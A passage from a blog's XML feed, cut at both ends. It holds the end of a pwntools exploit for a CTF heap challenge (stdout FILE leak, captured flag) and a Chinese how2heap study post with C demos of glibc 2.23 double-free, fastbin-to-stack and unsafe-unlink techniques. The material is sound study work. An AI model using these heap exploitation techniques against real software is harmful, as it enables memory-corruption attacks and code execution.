punctuation">)</span>    stdout <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"stdout : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 0x70 tcache chunk</span>    get<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"stdout"</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"stack_base : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag_addr <span class="token operator">=</span> stack<span class="token operator">&amp;</span><span class="token number">0xffffffffff000</span> <span class="token operator">+</span> flag    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"flag_addr : "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_addr <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#throw(1)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index of your lemon : '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 0x70 tcache chunk</span>    get<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"stdout"</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#flag&#123;f578948e-8b48-494d-a11e-a97b7fbf14ee&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-how2heap-2.23</title>
      <link href="//post/pwn-how2heap-2-23.html"/>
      <url>//post/pwn-how2heap-2-23.html</url>
      
        <content type="html"><![CDATA[<h1 id="how2heap-libc-2-23"><a href="#how2heap-libc-2-23" class="headerlink" title="how2heap libc-2.23"></a>how2heap libc-2.23</h1><h2 id="0x00-pre"><a href="#0x00-pre" class="headerlink" title="0x00 pre"></a>0x00 pre</h2><p>一直没有好好学过how2heap QAQ</p><p>是时候好好整理下这玩意了，就从libc- 2.23开始吧！</p><span id="more"></span><h2 id="0x01-fastbin-dup"><a href="#0x01-fastbin-dup" class="headerlink" title="0x01 fastbin_dup"></a>0x01 fastbin_dup</h2><p>fastbin 的double free，没啥好说的，就是libc-2.23对double free的检查只是看是不是fistbin list的第一个（也就是上一次free）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[fastbin] ==> main_arena -> a -> b -> a </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这玩意没啥好说的。。。</p><h2 id="0x03-fastbin-dup-consolidate"><a href="#0x03-fastbin-dup-consolidate" class="headerlink" title="0x03 fastbin_dup_consolidate"></a>0x03 fastbin_dup_consolidate</h2><p>这里介绍是libc-2.23的fastbin_dup_consolidate，更高版本会不太一样</p><p>话说这里就出现了知识盲区，我果然需要系统的补一下how2heap ……</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated two fastbins: p1=%p p2=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now free p1!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Trigger the double free vulnerability!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We can pass the check in malloc() since p1 is not fast top.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过调试发现，在第一次执行完<code> free(p1);</code>时，p1正常会被放入fastbin，</p><p>但是当执行完<code>void* p3 = malloc(0x400);</code>之后，即申请了一个largebin大小的chunk之后，会执行malloc_consolidate()，这个函数会遍历所有的 fastbin 把里面的 chunk 该合并合并，该清楚使用就标志清楚使用标志，在2.27或更高版本的libc中会全部插入 unsorted bin 中，而在libc-2.23中则会跳过这个步骤将这些chunk放到属于他们的bins中（同时fastbin清空）</p><p>在这里就会把p1放入smallbins中</p><p><img src="https://pic.imgdb.cn/item/61151a175132923bf82e251f.jpg"></p><p>在下一次 free 的时候，判断是不是 double free 仅仅根据从同一个大小的 fastbin 中拿出第一个 bin，比较地址是不是相同，而我们的 chunk 早到其他bins中去了。所以现在 fastbin 和samllbins中都有同一个 chunk也就是我们可以把它 malloc() 出来两次。</p><p><img src="https://pic.imgdb.cn/item/61151b705132923bf83119bc.jpg"></p><p>上图为 在ptmalloc的管理中，同一个chunk[0x602000]同时属于fastbins和smallbins。</p><p><img src="https://pic.imgdb.cn/item/61151c015132923bf8324cbc.jpg"></p><p>这同样达到了doublefree的效果。</p><h2 id="0x02-fastbin-dup-into-stack"><a href="#0x02-fastbin-dup-into-stack" class="headerlink" title="0x02 fastbin_dup_into_stack"></a>0x02 fastbin_dup_into_stack</h2><p>通过doublefree手段将chunk指针指向栈上</p><p><img src="https://pic.imgdb.cn/item/6115230a5132923bf841ca97.jpg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span>       <span class="token string">"returning a pointer to a controlled location (in this case, the stack).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The address we want malloc() to return is %p.\n"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// free(a);</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. "</span><span class="token string">"We'll now carry out our attack by modifying data at %p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p ].\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we have access to %p while it remains at the head of the free list.\n"</span><span class="token string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span><span class="token string">"so that malloc will think there is a free chunk there and agree to\n"</span><span class="token string">"return a pointer to it.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>stack_var <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"4th malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说就是利用doublefree使得fastbins链上出现：main_arena -&gt; chunk1 -&gt; chunk2 -&gt; chunk1</p><p>之后为了满足创建chunk时的size位检查，在栈上填入他的size位，之后申请chunk1，chunk2，</p><p>此时fastbins链上仍然还有：main_arena -&gt; chunk1</p><p>然后我们在chunk1中填入符合size检查的栈上的地址，这对free的chunk来说其实正是他的fd位，填完之后</p><p>此时fastbins链上会出现：main_arena -&gt; chunk1 -&gt; stack</p><p>之后我们在申请两次chunk，即可得到在栈上的chunk</p><h2 id="0x04-unsafe-unlink"><a href="#0x04-unsafe-unlink" class="headerlink" title="0x04 unsafe_unlink"></a>0x04 unsafe_unlink</h2><p>Unlink故名思义，取消链接，是内存管理对堆块（chunk）的一种拆离手段。简单来说，就是将一个chunk从双向链表中拆离下来。显然，这种利用Unlink的手段针对的是除fastbin以外的其他几个bin链。</p><p>我自己的理解Unlink就是在一个<strong>双向链表</strong>中，如果出现有<strong>物理相邻</strong>的两个区块且都是被free的状态，那么ptmalloc的unlink机制就会被触发，会将这两个chunk合并为一个被free状态的大chunk并从原来的链表中取出放入新的适合他位置的链表。</p><p>unsafe unlink 是利用<code>unlink</code>将已经构造好的 chunk 块释放掉达到任意地址写的目的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk0_ptr<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> malloc_size <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span> <span class="token comment">//we want to be big enough not to use fastbins</span><span class="token keyword">int</span> header_size <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>chunk0_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk0</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk1_ptr  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>malloc_size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk1</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The global chunk0_ptr is at %p, pointing to %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token punctuation">,</span> chunk0_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The victim chunk we are going to corrupt is at %p\n\n"</span><span class="token punctuation">,</span> chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We create a fake chunk inside chunk0.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P->fd->bk = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P->bk->fd = P.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>chunk0_ptr<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk fd: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake chunk bk: %p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span>chunk1_hdr <span class="token operator">=</span> chunk1_ptr <span class="token operator">-</span> header_size<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> malloc_size<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>chunk1_hdr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token 